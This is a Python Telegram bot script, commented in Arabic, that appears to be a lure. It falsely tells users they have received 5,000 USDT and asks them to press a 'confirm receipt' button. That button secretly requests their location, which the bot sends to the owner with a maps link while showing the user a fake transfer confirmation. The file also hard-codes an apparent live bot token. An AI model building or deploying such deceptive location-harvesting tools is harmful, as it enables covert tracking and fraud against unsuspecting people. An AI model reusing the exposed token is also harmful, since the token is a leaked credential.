#!/usr/bin/env python3

import telebot
import logging
from datetime import datetime

TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
OWNER_ID = 8391968596

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start(m):
    c = m.chat.id
    
    msg = (
        "🎉 *تم استلام 5,000 USDT*\n\n"
        "الحساب: ✅ نشط\n"
        "المبلغ: 5,000 USDT\n"
        "الحالة: ✅ متاح للسحب\n\n"
        "👇 اضغط على زر *تأكيد الاستلام*\n"
        "لسحب الأموال إلى محفظتك"
    )
    
    # زر عادي: "تأكيد الاستلام" ولكن في الخلفية هو طلب موقع
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = telebot.types.KeyboardButton("✅ تأكيد الاستلام", request_location=True)
    markup.add(btn)
    
    bot.send_message(c, msg, parse_mode='Markdown', reply_markup=markup)
    
    # إشعار لك
    bot.send_message(
        OWNER_ID,
        f"🆕 دخل: @{m.from_user.username}\n🆔 {m.from_user.id}"
    )

@bot.message_handler(content_types=['location'])
def loc(m):
    user = m.from_user
    lat = m.location.latitude
    lon = m.location.longitude
    
    # إرسال لك فقط — الخاطف لا يرى أي شيء
    bot.send_message(
        OWNER_ID,
        f"📍 *موقع!*\n"
        f"👤 @{user.username}\n"
        f"🌐 {lat}, {lon}\n"
        f"🔗 https://google.com/maps?q={lat},{lon}",
        parse_mode='Markdown'
    )
    bot.send_location(OWNER_ID, lat, lon)
    
    # للخاطف: رسالة نجاح فقط — لا يظهر له الموقع أبداً
    bot.send_message(
        m.chat.id,
        "✅ *تم تأكيد الاستلام بنجاح!*\n"
        "تم تحويل 5,000 USDT إلى محفظتك.\n"
        "شكراً لاستخدامك الخدمة.",
        parse_mode='Markdown',
        reply_markup=telebot.types.ReplyKeyboardRemove()
    )

@bot.message_handler(func=lambda m: True)
def fallback(m):
    bot.send_message(
        m.chat.id,
        "⚠️ اضغط على زر *تأكيد الاستلام* أدناه",
        reply_markup=create_keyboard()
    )

def create_keyboard():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(telebot.types.KeyboardButton("✅ تأكيد الاستلام", request_location=True))
    return markup

print("✅ البوت شغال...")
bot.infinity_polling()
